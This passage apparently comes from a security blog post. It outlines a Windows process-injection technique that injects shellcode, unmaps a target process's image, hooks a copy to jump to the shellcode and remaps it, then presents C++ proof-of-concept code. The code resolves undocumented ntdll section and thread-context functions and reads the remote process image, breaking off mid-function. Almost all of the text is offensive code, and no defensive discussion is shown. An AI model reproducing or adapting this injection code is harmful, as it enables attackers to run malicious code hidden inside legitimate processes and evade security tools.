&lt;p&gt;The steps can be briefly described as follow.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- Injecting the shellcode into target process
- Retrieve ImageBaseAddress of the executable image
- Read executable image of the remote process into a buffer
- Unmap executable image from the process 
- Hook somewhere of the copied image so it will jump to shellcode
- Remap the section into the remote process using above techniques
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here is the PoC code.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;winternl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#pragma comment(lib, &amp;#34;ntdll&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SECTION_SIZE 0x1000
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HRSRC shellcodeResource;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    SIZE_T shellcodeSize;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; shellcode;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} SHELLCODE;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HANDLE processHandle;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DWORD imageBaseAddress;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DWORD entryPoint;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} HOST;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#if !defined NTSTATUS
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; LONG NTSTATUS;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define STATUS_SUCCESS 0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; CLIENT_ID&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; PCLIENT_ID;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myNtCreateSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    OUT PHANDLE SectionHandle,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IN ULONG DesiredAccess,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IN PLARGE_INTEGER MaximumSize OPTIONAL,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IN ULONG PageAttributess,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IN ULONG SectionAttributes,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IN HANDLE FileHandle OPTIONAL
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myNtMapViewOfSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HANDLE SectionHandle,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HANDLE ProcessHandle,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PVOID&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; BaseAddress,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ULONG_PTR ZeroBits,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    SIZE_T CommitSize,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PLARGE_INTEGER SectionOffset,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PSIZE_T ViewSize,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DWORD InheritDisposition,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ULONG AllocationType,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ULONG Win32Protect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myZwUnmapViewOfSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IN HANDLE ProcessHandle,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IN PVOID BaseAddress
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myNtGetContextThread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IN HANDLE ThreadHandle,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    OUT PCONTEXT Context
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myNtSetContextThread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IN HANDLE ThreadHandle,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IN PCONTEXT Context
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;myNtCreateSection fNtCreateSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myNtCreateSection)(GetProcAddress(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NtCreateSection&amp;#34;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;myNtMapViewOfSection fNtMapViewOfSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myNtMapViewOfSection)(GetProcAddress(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NtMapViewOfSection&amp;#34;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;myZwUnmapViewOfSection fZwUnmapViewOfSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myZwUnmapViewOfSection)(GetProcAddress(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ZwUnmapViewOfSection&amp;#34;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;myNtGetContextThread fNtGetContextThread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myNtGetContextThread)(GetProcAddress(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NtGetContextThread&amp;#34;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;myNtSetContextThread fNtSetContextThread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myNtSetContextThread)(GetProcAddress(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NtSetContextThread&amp;#34;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DWORD &lt;span style=&#34;color:#a6e22e&#34;&gt;GetSizeOfImage&lt;/span&gt;(BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; processImage)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IMAGE_DOS_HEADER&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; dosHeader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IMAGE_NT_HEADERS&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ntHeaders &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dosHeader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (IMAGE_DOS_HEADER&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ntHeaders &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (IMAGE_NT_HEADERS&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; dosHeader&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_lfanew);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ntHeaders&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;OptionalHeader.SizeOfImage;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DWORD &lt;span style=&#34;color:#a6e22e&#34;&gt;GetEntryPoint&lt;/span&gt;(BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; processImage)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IMAGE_DOS_HEADER&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; dosHeader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IMAGE_NT_HEADERS&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ntHeaders &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dosHeader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (IMAGE_DOS_HEADER&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ntHeaders &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (IMAGE_NT_HEADERS&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; dosHeader&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_lfanew);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (ntHeaders&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;OptionalHeader.AddressOfEntryPoint);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PVOID &lt;span style=&#34;color:#a6e22e&#34;&gt;PatchHostProcess&lt;/span&gt;(HOST&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; hostProcess, PVOID shellcodeAddress)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// read enough bytes to get the size of image
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    SIZE_T bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; imageData &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt;(BYTE[SECTION_SIZE]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// both calls read the same chunk of same size because this readprocessmemory fails we change the size 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;ReadProcessMemory(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (LPCVOID)hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        imageData,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        SECTION_SIZE, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; SECTION_SIZE)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] failed to read process image headers&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DWORD sizeOfImage &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GetSizeOfImage(imageData);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;delete&lt;/span&gt;[] imageData;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; processImage &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt;(BYTE[sizeOfImage]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;ReadProcessMemory(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (LPCVOID)hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        processImage,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sizeOfImage, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; sizeOfImage)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] failed to read process image&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DWORD entryPoint &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GetEntryPoint(processImage);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
